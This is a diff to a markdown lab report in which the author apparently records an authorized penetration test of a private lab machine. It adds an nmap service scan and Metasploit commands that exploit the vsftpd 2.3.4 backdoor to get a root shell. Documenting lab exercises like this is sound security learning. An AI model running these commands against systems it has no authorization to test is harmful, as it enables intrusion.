@@ -46,8 +46,24 @@ security weaknesses, and document appropriate remediation.
 
 ## Findings
 
-Findings will be documented after completing the authorized
-laboratory assessment.
+### Phase 1: Network Reconnaissance (Nmap)
+I performed a service version scan against the target IP (192.168.56.101).
+
+Command used: nmap -sV 192.168.56.101
+
+Results: Identified 23 open ports, including the notoriously vulnerable vsftpd 2.3.4 service.
+
+![Root shell](root_shell.png)
+
+### Phase 2: Exploitation (Metasploit)
+I exploited the vsftpd 2.3.4 backdoor using the Metasploit Framework.
+
+Command used:
+```bash
+msfconsole
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS 192.168.56.101
+run
 
 ## Lessons Learned
 
